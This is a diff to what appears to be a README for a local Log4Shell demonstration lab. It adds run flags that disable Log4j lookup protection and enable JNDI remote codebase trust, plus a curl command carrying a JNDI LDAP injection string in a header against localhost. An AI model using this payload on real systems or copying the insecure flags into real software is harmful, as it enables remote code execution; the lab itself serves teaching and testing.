@@ -25,6 +25,14 @@ mvn clean install
 ```
 mvn exec:java -Dexec.mainClass=demo.VulnerableServer  
 ```
+or
+
+```
+mvn exec:java -Dexec.mainClass=demo.VulnerableServer \
+    -Dlog4j2.formatMsgNoLookups=false \
+    -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
+```
+
 ###Terminal 2
 
 ```
@@ -33,7 +41,9 @@ mvn exec:java -Dexec.mainClass=demo.CallbackMonitor
 
 ###Terminal 3
 
-
+```
+curl -H 'X-Api-Token: ${jndi:ldap://127.0.0.1:1389/exploit}' http://localhost:8080/
+```
 
 ###Troubleshooting if no callback output 
 
